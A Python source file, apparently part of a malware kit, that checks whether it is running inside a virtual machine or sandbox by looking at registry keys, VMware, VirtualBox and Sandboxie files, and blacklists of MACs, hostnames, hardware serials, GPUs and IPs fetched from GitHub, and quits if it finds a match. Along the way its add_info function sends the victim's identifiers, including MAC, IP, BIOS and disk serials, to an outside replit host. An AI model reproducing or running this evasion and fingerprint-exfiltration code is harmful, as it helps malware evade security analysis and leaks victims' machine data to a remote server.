import re, uuid, wmi, requests, os, ctypes, sys, subprocess, socket, platform
appdata = os.getenv("APPDATA")
DEBUG = True

def mark():
    if not os.path.exists(appdata + "\\Windows_Cache1.log"):
        with open(appdata + "\\Windows_Cache1.log", "w") as f:
            f.write("")

def add_info(msg):
    if DEBUG:
        print("[DEBUG] " + msg)

    try: r = requests.get(f"https://EarlyAverageLesson.flashout24.repl.co/add/{msg}")
    except: pass

def get_base_prefix_compat(): # define all of the checks
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix

if in_virtualenv() == True: # if we are in a vm
    os._exit(1) # exit
    
class BypassVM:

    def registry_check(self):  
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:
            mark()
            os._exit(1)

    def processes_and_files_check(self):
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
    
        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            mark()
            os._exit(1)
                           
        if os.path.exists(vmware_dll): # Detect vmware dll
            mark()
            os._exit(1)
            
        if os.path.exists(virtualbox_dll): # Detect virtualbox dll
            mark()
            os._exit(1)
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll") # Detect sandbox dll
            mark()
            os._exit(1)
        except: pass

    def mac_check(self):    # Mac detect
        mac_list = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/mac_list.txt").text
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        if mac_address in mac_list:
            mark()
            os._exit(1)

        add_info(f"Mac Address:{mac_address}")
    
    def check_pc(self):     # User/Name Detect
        vmname      = os.getlogin()
        vm_name     = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/pc_name_list.txt").text
        vmusername  = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/pc_username_list.txt").text
        
        if vmname in vm_name:
            mark()
            os._exit(1)
        
        host_name = socket.gethostname()
        if host_name in vmusername:
            mark()
            os._exit(1)

        add_info(f"VM Name:{vmname}")
        add_info(f"Host Name:{host_name}")
                
    def hwid_vm(self):      # HWID detect
        hwid_vm = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/hwid_list.txt").text
        current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

        if current_machine_id in hwid_vm:
            mark()
            os._exit(1)

        add_info(f"Machine ID:{current_machine_id}")
            
    def checkgpu(self):     # GPU Detect
        gpulist = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/gpu_list.txt").text
        c       = wmi.WMI()

        for gpu in c.Win32_DisplayConfiguration():
            GPUm = gpu.Description.strip()

            if GPUm in gpulist:
                mark()
                os._exit(1)

            add_info(f"GPU:{GPUm}")

    def check_ip(self):     # IP Detect
        ip_list = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/ip_list.txt").text
        reqip   = requests.get("https://api.ipify.org/?format=json").json()
        ip      = reqip["ip"]

        if ip in ip_list:
            mark()
            os._exit(1)

        add_info(f"IP:{ip}")
            
    def profiles():         # Guids / Bios Detect etc
        guid_pc         = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/MachineGuid.txt").text
        bios_guid       = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/BIOS_Serial_List.txt").text
        baseboard_guid  = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt").text
        serial_disk     = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt").text
        hwprid          = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/HwProfileGuid_List.txt").text
        serial_list     = requests.get("https://raw.githubusercontent.com/CookiesKush/virustotal-vm-blacklist/main/CPU_Serial_List.txt").text

        w = wmi.WMI()
        machine_guid = uuid.getnode()
        serial_ = platform.processor()

        #region Check
        if machine_guid in guid_pc:
            mark()
            os._exit(1)

        add_info(f"Machine Guid:{machine_guid}")

        if serial_ in serial_list:
            mark()
            os._exit(1)

        add_info(f"Serial:{serial_}")

        for profile in w.Win32_ComputerSystem():
            hw_profile_guid = profile.Model

            if hw_profile_guid in hwprid:
                mark()
                os._exit(1)

            add_info(f"Profile Guid:{hw_profile_guid}")

        for bios in w.Win32_BIOS():
            bios_check = bios.SerialNumber   

            if bios_check in bios_guid:
                mark()
                os._exit(1) 

            add_info(f"BIOS:{bios_check}")

        for baseboard in w.Win32_BaseBoard():
            base_check = baseboard.SerialNumber

            if base_check in baseboard_guid:
                mark()
                os._exit(1)

            add_info(f"Motherboard:{base_check}")

        for disk in w.Win32_DiskDrive():
            disk_serial = disk.SerialNumber

            if disk_serial in serial_disk:
                mark()
                os._exit(1)

            add_info(f"Disk:{disk_serial}")
        #endregion


def Bypass():
    if os.path.exists(appdata + "\\Windows_Cache0.log"):
        os.remove(appdata + "\\Windows_Cache0.log")
    
    if os.path.exists(appdata + "\\Windows_Cache1.log"):
        os.remove(appdata + "\\Windows_Cache1.log")

    test = BypassVM()
    test.registry_check()
    test.processes_and_files_check()
    test.mac_check()
    test.check_pc()
    test.checkgpu()
    test.hwid_vm()
    test.check_ip()
    test.profiles()

    with open(appdata + "\\Windows_Cache0.log", "w") as f:
        f.write("")